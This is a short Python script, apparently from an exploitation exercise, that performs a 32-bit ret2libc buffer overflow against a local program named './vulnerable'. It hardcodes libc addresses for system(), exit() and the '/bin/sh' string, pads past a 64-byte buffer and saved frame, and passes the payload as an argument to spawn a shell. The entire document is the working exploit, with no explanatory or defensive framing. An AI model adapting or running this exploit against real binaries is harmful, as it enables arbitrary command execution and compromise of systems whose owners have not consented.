import struct
from subprocess import call

def conv(num):
    return struct.pack("<I", num)

def main():
    libc_base = 0xf7d86000
    system_offset = 0x00047cd0
    exit_offset = 0x0003a1f0
    bin_sh_offset = 0x1b90d5

    system = libc_base + system_offset
    exit = libc_base + exit_offset
    bin_sh = libc_base + bin_sh_offset

    buffer_size = 64
    padding = b"A" * buffer_size
    ebp_padding = b"B" * 12 # use 32 bit binary executable, ebp + 8 = 1 parameter, ebp + 12 = return address

    payload = padding + ebp_padding + conv(system) + conv(exit) + conv(bin_sh)

    print(f"[*] system() : 0x{system:08x}")
    print(f"[*] exit() : 0x{exit:08x}")
    print(f"[*] '/bin/sh' : 0x{bin_sh:08x}")

    call(["./vulnerable", payload])

if __name__ == '__main__':
    main()

